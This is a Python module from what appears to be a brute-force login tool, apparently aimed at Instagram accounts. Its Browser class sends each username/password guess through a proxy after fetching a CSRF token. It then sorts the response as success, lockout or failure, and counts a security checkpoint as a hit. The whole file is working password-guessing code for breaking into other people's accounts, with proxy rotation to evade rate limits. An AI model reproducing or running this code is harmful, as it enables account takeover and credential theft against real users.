# Date: 12/28/2018
# Author: Mohamed
# Description: Browser

from time import time 
from requests import Session
from .const import browser_data, response_codes, fetch_time


class Browser(object):

    def __init__(self, username, password, proxy):
        self.proxy = proxy 
        self.is_found = False 
        self.is_active = True 
        self.is_locked = False
        self.start_time = None 
        self.browser = self.br()
        self.username = username
        self.password = password
        self.is_attempted = False 
        
    def br(self):
        session = Session()
        session.proxies.update(self.proxy.addr)
        session.headers.update(browser_data['header'])
        return session     
    
    def get_token(self): 
        token = None        
        try:
            token = self.browser.get(browser_data['home_url']).cookies.get_dict()['csrftoken']
        except:
            pass 
        finally:
            return token
    
    def post_data(self):
        response = None 
        data = { browser_data['username_field']: self.username, browser_data['password_field']: self.password }

        try:
            response = self.browser.post(browser_data['login_url'], data=data, timeout=fetch_time).json()
        except:
            pass 
        finally:
            return response

    def check_response(self, response):
        if 'authenticated' in response:
            if response['authenticated']:
                return response_codes['succeed']

        if 'message' in response:
            if response['message'] == 'checkpoint_required':
                return response_codes['succeed']

            if response['status'] == 'fail':
                return response_codes['locked']
                            
        return response_codes['failed'] 
            
    def authenicate(self):
        response = self.post_data()
        resp = { 'attempted': False, 'accessed': False, 'locked': False }

        if response:
            resp['attempted'] = True 
            resp_code = self.check_response(response)

            if resp_code == response_codes['locked']:
                resp['locked'] = True 

            if resp_code == response_codes['succeed']:
                resp['accessed'] = True 
                                        
        return resp

    def attempt(self):
        self.start_time = time()
        token = self.get_token()

        if token:
            self.browser.headers.update({ 'x-csrftoken': token })
            resp = self.authenicate()

            if resp['attempted']:
                self.is_attempted = True

                if not resp['locked']:
                    if resp['accessed']:
                        self.is_found = True
                else:
                    self.is_locked = True 

        self.is_active = False